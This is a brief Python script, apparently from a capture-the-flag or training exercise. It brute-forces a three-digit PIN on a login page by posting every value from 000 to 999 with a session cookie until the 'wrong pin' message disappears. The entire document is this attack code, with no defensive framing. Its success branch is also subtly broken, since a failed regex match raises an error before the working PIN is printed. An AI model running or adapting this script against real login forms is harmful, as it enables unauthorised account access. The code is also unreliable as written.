#!/usr/bin/python3

import requests
import re
import time

url = "http://10.cybertrial.co.uk/login"
cookies = {"PHPSESSID": "i0tmtg2uc3i51oru4hra5ei6l0"}

r = requests.session()
curPin = 0

for curPin in range(0, 1000):
	payload = {"formgo": "1", "pin": "{0:0=3d}".format(curPin)}
	print("Trying pin: " + payload["pin"])

	response = r.post(url, data=payload, cookies=cookies)

	check = re.search("you entered a wrong pin", response.text)

	if(check[0] == "you entered a wrong pin"):
		time.sleep(1)
	else:
		print(response.text)
		print("Working pin: " + payload["pin"])
		break;

